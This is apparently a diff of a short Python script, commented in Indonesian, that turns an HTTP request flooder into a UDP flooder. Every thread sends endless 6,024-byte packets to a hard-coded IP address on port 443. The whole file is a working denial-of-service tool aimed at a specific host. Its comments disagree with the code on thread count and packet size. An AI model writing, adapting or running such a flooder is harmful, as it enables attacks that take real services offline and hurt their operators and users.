@@ -1,28 +1,29 @@
 import socket
 import threading
- 
-def send_request():
+
+def send_udp(max_bytes):
     while True:
-        # Membuat socket TCP
-        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Membuat socket UDP
+        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         # Mengganti alamat dan port sesuai kebutuhan (contoh: alamat IP dan port)
-        server_address = ('158.220.106.212', 80)
+        server_address = ('158.220.106.212', 443)
 
-        # Mencoba untuk terhubung ke server
-        tcp_socket.connect(server_address)
+        # Membuat data yang akan dikirim (misalnya, mengisi data dengan karakter 'A' sebanyak max_bytes)
+        data_to_send = b'A' * max_bytes
 
         # Mengirim data
-        tcp_socket.sendall(b'GET / HTTP/1.1\r\nHost: 158.220.106.212\r\n\r\n')
+        udp_socket.sendto(data_to_send, server_address)
 
         # Menutup koneksi
-        tcp_socket.close()
-        print("Request sent successfully!")
+        udp_socket.close()
+        print(f"UDP packet (max {max_bytes} bytes) sent successfully!")
 
-# Membuat 10 thread
+# Membuat 10 thread, masing-masing mengirimkan paket UDP maksimum 1024 bytes
+max_udp_bytes = 6024
 threads = []
-for _ in range(10000):
-    thread = threading.Thread(target=send_request)
+for _ in range(100):
+    thread = threading.Thread(target=send_udp, args=(max_udp_bytes,))
     threads.append(thread)
 
 # Menjalankan setiap thread
